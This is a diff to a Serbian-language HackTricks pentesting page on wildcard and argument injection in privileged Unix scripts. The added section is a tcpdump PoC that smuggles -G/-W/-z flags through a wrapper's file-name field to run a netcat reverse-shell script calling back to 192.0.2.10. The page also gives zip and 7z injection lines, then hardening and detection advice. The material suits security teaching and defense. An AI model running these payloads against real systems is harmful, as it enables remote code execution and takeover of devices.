@@ -2,8 +2,8 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-> Wildcard (poznat i kao *glob*) **injekcija argumenata** se dešava kada privilegovani skript pokreće Unix binarni fajl kao što su `tar`, `chown`, `rsync`, `zip`, `7z`, … sa necitiranim wildcard-om kao što je `*`.
-> Pošto ljuska širi wildcard **pre** izvršavanja binarnog fajla, napadač koji može da kreira fajlove u radnom direktorijumu može da napravi imena fajlova koja počinju sa `-` tako da se tumače kao **opcije umesto podataka**, efikasno krijući proizvoljne zastavice ili čak komande.
+> Wildcard (aka *glob*) **injekcija argumenata** se dešava kada privilegovani skript pokrene Unix binarni fajl kao što su `tar`, `chown`, `rsync`, `zip`, `7z`, … sa nequoted wildcard-om kao što je `*`.
+> Pošto ljuska proširuje wildcard **pre** izvršavanja binarnog fajla, napadač koji može da kreira fajlove u radnom direktorijumu može da napravi imena fajlova koja počinju sa `-` tako da se tumače kao **opcije umesto podataka**, efikasno krijući proizvoljne zastavice ili čak komande.
 > Ova stranica prikuplja najkorisnije primitivne tehnike, nedavna istraživanja i moderne detekcije za 2023-2025.
 
 ## chown / chmod
@@ -65,7 +65,7 @@ Ako root kasnije arhivira direktorijum sa `rsync -az * backup:/srv/`, injektovan
 
 ## 7-Zip / 7z / 7za
 
-Čak i kada privilegovani skript *defensivno* prefiksira wildcard sa `--` (da zaustavi parsiranje opcija), 7-Zip format podržava **datoteke sa listom datoteka** prefiksiranjem imena datoteke sa `@`. Kombinovanjem toga sa simboličkom vezom možete *ekstraktovati proizvoljne datoteke*:
+Čak i kada privilegovani skript *defensivno* prefiksira wildcard sa `--` (da zaustavi parsiranje opcija), 7-Zip format podržava **datoteke sa listom datoteka** prefiksiranjem imena datoteke sa `@`. Kombinovanjem toga sa simboličkom vezom možete *ekstrahovati proizvoljne datoteke*:
 ```bash
 # directory writable by low-priv user
 cd /path/controlled
@@ -86,13 +86,13 @@ Ako root izvrši nešto poput:
 ```bash
 zip result.zip files -T --unzip-command "sh -c id"
 ```
-Injectujte zastavicu putem kreiranog imena datoteke i sačekajte da privilegovani skript za pravljenje rezervnih kopija pozove `zip -T` (testiranje arhive) na rezultantnoj datoteci.
+Injectujte zastavicu putem kreiranog imena datoteke i sačekajte da privilegovani skript za pravljenje rezervnih kopija pozove `zip -T` (test arhivu) na rezultantnoj datoteci.
 
 ---
 
-## Dodatni binarni programi ranjivi na injekciju džokera (brza lista 2023-2025)
+## Dodatni binarni programi ranjivi na injekciju wildcards (brza lista 2023-2025)
 
-Sledeće komande su zloupotrebljavane u modernim CTF-ovima i stvarnim okruženjima. Teret je uvek kreiran kao *ime datoteke* unutar pisive direktorijuma koji će kasnije biti obrađen sa džokerom:
+Sledeće komande su zloupotrebljavane u modernim CTF-ovima i stvarnim okruženjima. Payload se uvek kreira kao *ime datoteke* unutar pisive direktorijuma koji će kasnije biti obrađen sa wildcard-om:
 
 | Binarni program | Zastavica za zloupotrebu | Efekat |
 | --- | --- | --- |
@@ -105,19 +105,65 @@ Ove primitivne komande su manje uobičajene od klasičnih *tar/rsync/zip*, ali i
 
 ---
 
-## Detekcija i učvršćivanje
+## tcpdump rotacione kuke (-G/-W/-z): RCE putem argv injekcije u omotačima
 
-1. **Onemogućite globbing ljuske** u kritičnim skriptama: `set -f` (`set -o noglob`) sprečava ekspanziju džokera.
-2. **Citat ili eskapiranje** argumenata: `tar -czf "$dst" -- *` nije *sigurno* — preferirajte `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
-3. **Eksplicitne putanje**: Koristite `/var/www/html/*.log` umesto `*` kako napadači ne bi mogli da kreiraju susedne datoteke koje počinju sa `-`.
-4. **Najmanje privilegije**: Pokrećite poslove pravljenja rezervnih kopija/održavanja kao nepovlašćeni servisni nalog umesto root-a kad god je to moguće.
-5. **Praćenje**: Elasticova unapred izgrađena pravila *Potencijalna ljuska putem injekcije džokera* traži `tar --checkpoint=*`, `rsync -e*`, ili `zip --unzip-command` odmah praćeno procesom deteta ljuske. EQL upit može biti prilagođen za druge EDR-ove.
+Kada ograničena ljuska ili omotač dobavljača gradi `tcpdump` komandnu liniju konkatenacijom polja pod kontrolom korisnika (npr., parametar "ime datoteke") bez stroge citacije/validacije, možete prokrijumčariti dodatne `tcpdump` zastavice. Kombinacija `-G` (rotacija zasnovana na vremenu), `-W` (ograničenje broja datoteka) i `-z <cmd>` (komanda nakon rotacije) dovodi do proizvoljnog izvršavanja komandi kao korisnik koji pokreće tcpdump (često root na uređajima).
+
+Preduslovi:
+
+- Možete uticati na `argv` prosleđen `tcpdump`-u (npr., putem omotača kao što je `/debug/tcpdump --filter=... --file-name=<HERE>`).
+- Omotač ne sanitizuje razmake ili `-`-prefiksirane tokene u polju imena datoteke.
+
+Klasični PoC (izvršava skriptu za obrnuti shell iz pisivog puta):
+```sh
+# Reverse shell payload saved on the device (e.g., USB, tmpfs)
+cat > /mnt/disk1_1/rce.sh <<'EOF'
+#!/bin/sh
+rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
+EOF
+chmod +x /mnt/disk1_1/rce.sh
+
+# Inject additional tcpdump flags via the unsafe "file name" field
+/debug/tcpdump --filter="udp port 1234" \
+--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"
+
+# On the attacker host
+nc -6 -lvnp 4444 &
+# Then send any packet that matches the BPF to force a rotation
+printf x | nc -u -6 [victim_ipv6] 1234
+```
+Detalji:
+
+- `-G 1 -W 1` prisiljava trenutnu rotaciju nakon prvog odgovarajućeg paketa.
+- `-z <cmd>` pokreće post-rotacionu komandu jednom po rotaciji. Mnogi buildovi izvršavaju `<cmd> <savefile>`. Ako je `<cmd>` skripta/interpreter, osigurajte da obrada argumenata odgovara vašem payload-u.
+
+Varijante bez uklonjivih medija:
+
+- Ako imate bilo koju drugu primitivnu metodu za pisanje fajlova (npr. poseban komandni omotač koji omogućava preusmeravanje izlaza), stavite svoju skriptu u poznatu putanju i aktivirajte `-z /bin/sh /path/script.sh` ili `-z /path/script.sh` u zavisnosti od platformskih semantika.
+- Neki omotači dobavljača rotiraju na lokacije pod kontrolom napadača. Ako možete uticati na rotiranu putanju (symlink/direktorijum prolaz), možete usmeriti `-z` da izvrši sadržaj koji potpuno kontrolišete bez spoljnog medija.
+
+Saveti za učvršćivanje za dobavljače:
+
+- Nikada ne prosledite stringove pod kontrolom korisnika direktno `tcpdump`-u (ili bilo kom alatu) bez strogo definisanih lista dozvoljenih. Citirajte i validirajte.
+- Ne izlažite funkcionalnost `-z` u omotačima; pokrenite tcpdump sa fiksnim sigurnim šablonom i potpuno zabranite dodatne zastavice.
+- Smanjite privilegije tcpdump-a (samo cap_net_admin/cap_net_raw) ili pokrenite pod posvećenim korisnikom bez privilegija uz AppArmor/SELinux ograničenje.
+
+
+## Detekcija & Učvršćivanje
+
+1. **Onemogućite shell globbing** u kritičnim skriptama: `set -f` (`set -o noglob`) sprečava ekspanziju wildcards.
+2. **Citirajte ili escape-ujte** argumente: `tar -czf "$dst" -- *` *nije* sigurno — preferirajte `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
+3. **Eksplicitne putanje**: Koristite `/var/www/html/*.log` umesto `*` tako da napadači ne mogu kreirati susedne fajlove koji počinju sa `-`.
+4. **Najmanje privilegije**: Pokrećite backup/održavanje poslove kao uslugu bez privilegija umesto kao root kad god je to moguće.
+5. **Monitoring**: Elastic-ovo unapred izgrađeno pravilo *Potencijalni Shell putem Wildcard Injekcije* traži `tar --checkpoint=*`, `rsync -e*`, ili `zip --unzip-command` odmah nakon čega sledi shell child proces. EQL upit se može prilagoditi za druge EDR-ove.
 
 ---
 
 ## Reference
 
-* Elastic Security – Pravilo Detektovana potencijalna ljuska putem injekcije džokera (poslednje ažurirano 2025)
-* Rutger Flohil – “macOS — Injekcija džokera u tar” (18. decembar 2024)
+* Elastic Security – Pravilo Detektovano *Potencijalni Shell putem Wildcard Injekcije* (poslednje ažurirano 2025)
+* Rutger Flohil – “macOS — Tar wildcard injection” (18. decembar 2024)
+* GTFOBins – [tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
+* FiberGateway GR241AG – [Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
 
 {{#include ../../banners/hacktricks-training.md}}
